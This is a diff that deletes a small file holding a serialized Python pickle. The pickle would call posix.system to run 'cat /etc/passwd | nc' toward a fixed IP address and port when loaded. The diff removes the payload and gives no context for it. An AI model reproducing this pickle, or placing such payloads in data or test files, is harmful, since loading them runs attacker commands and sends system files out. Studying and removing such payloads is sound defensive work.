@@ -1,8 +1,0 @@
-cposix
-system
-p0
-(Vcat /etc/passwd | nc 172.24.173.58 4444
-p1
-tp2
-Rp3
-.
